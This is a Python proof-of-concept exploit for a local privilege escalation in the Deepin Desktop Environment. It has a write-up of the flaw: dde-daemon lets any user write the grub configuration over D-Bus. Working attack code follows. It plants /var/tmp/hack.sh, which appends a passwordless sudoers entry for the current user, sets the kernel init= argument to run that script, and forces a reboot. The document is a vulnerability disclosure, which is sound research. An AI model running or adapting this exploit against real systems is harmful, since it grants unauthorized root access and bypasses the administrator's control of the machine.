#!/usr/bin/env python2
#encoding=utf8

'''
# Exploit Title: Local Privilege Escalation in DDE (Deepin Desktop Environment)
# Date: 20170401
# Exploit Author: King's Way <io[AT]stdio.io>
# Vendor Homepage: http://www.deepin.org
# Software Link: https://www.deepin.org/en/dde/desktop-transplantation/
# Affected Version: DDE >= 15
# Affected Distros: Ubuntu==16.04(PPA, leaeasy/dde), Fedora>=24(copr, mosquito/deepin),
#					ArchLinux, Deepin>=15, Manjaro(with DDE) and so on...
# Tested on: Deepin 15.3, ArchLinux, Fedora25(copr), Manjaro(with DDE),

--------------------- 【Introduction of DDE】 ------------------
DDE is short for deepin desktop environment, created by Deepin Linux. It has 
been ported into many other famous Linux distros, like Arch Linux, Ubuntu, 
Fedora, Gentoo, Manjaro Linux，SparkyLinux and so on.
(As listed here https://www.deepin.org/en/dde/desktop-transplantation/)

dde-daemon is a part of DDE. It runs with root privilege, provides service for 
other front-end deepin apps through dbus message. dde-daemon exists in DDE whose
version is larger than deepin 15.

-------------------- 【Vulnerability details】 -----------------
There is a panel for user to easily change grub config through the control panel.
Actually, it will call DoWriteGrubSettings(), a function provided by dde-daemon,
to write /etc/default/grub. Then call DoGenerateGrubMenu() to update grub.cfg.

The point here is dde-daemon hardly do anything to identify the user who calls 
the function. So, anybody can change the grub config, even to append some 
arguments to make a backdoor or privilege escalation if they have the ability to
reboot the system or wait for a reboot.

------------------------ 【About the POC】 ----------------------
This poc performs privilege escalation by adding a sudo-user without password in
the file '/etc/sudoers'. It's been tested on the latest version of Deepin Linux,
ArchLinux, Manjaro Linux(DDE version), and it works on Deepin and Manjaro. 

It does not work on ArchLinux and Fedora cause dde-daemon runs 'update-grub' to 
update config, which ArchLinux and Fedora do not have this preinstalled, a bug of 
the developer... However, it still makes it to change /etc/default/grub. And it 
will work if the administrator update grub.cfg manually some time later...

For some other Linux distributions, DDE may only exists in additional repos 
powered by the community, like ppa in Ubuntu and copr in Fedora.
'''

import os
import time
import dbus
import getpass

username = getpass.getuser()

grub  = '''GRUB_BACKGROUND="/boot/grub/themes/deepin/background.png"
GRUB_CMDLINE_LINUX_DEFAULT="splash quiet init=/var/tmp/hack.sh"
GRUB_DEFAULT="0"
GRUB_DISTRIBUTOR="`/usr/bin/lsb_release -d -s 2>/dev/null || echo Debian`"
GRUB_GFXMODE="1024x768"
GRUB_THEME="/boot/grub/themes/deepin/theme.txt"
GRUB_TIMEOUT="5"
'''

shell = '''#!/bin/bash
clear
echo "############################################"
echo "###### POC by King's Way <io[AT]stdio.io> ######"
echo "############################################"
echo 
echo "Start Dirty Work..."
mount -o rw,remount /
echo "%s ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
echo "Done!"
echo "Restore the boot args..."
sed -i 's/init=.*/"/g' /etc/default/grub
sed -i 's/init=.*//g' /boot/grub/grub.cfg
sed -i 's/init=.*//g' /boot/grub2/grub.cfg  # for fedora
echo "Done!"
echo "Ready to exec init in 2 seconds..."
sleep 1
exec /sbin/init''' % (username)

print "Preparing the needed scripts..."
f = open('/var/tmp/hack.sh', 'w')
f.write(shell)
f.close()
os.chmod('/var/tmp/hack.sh', 0755)
print "Done!"
print "Calling the function of dde.daemon using D-BUS..."
bus = dbus.SystemBus()
interface = dbus.Interface(bus.get_object('com.deepin.daemon.Grub2Ext', 
			'/com/deepin/daemon/Grub2Ext'), 
			'com.deepin.daemon.Grub2Ext')
interface.DoWriteGrubSettings(grub)
interface.DoGenerateGrubMenu()
print "Done!"
print "Ready to reboot in 3 seconds... Press Ctrl-C to stop this..."
time.sleep(3)
os.system('systemctl reboot -i')
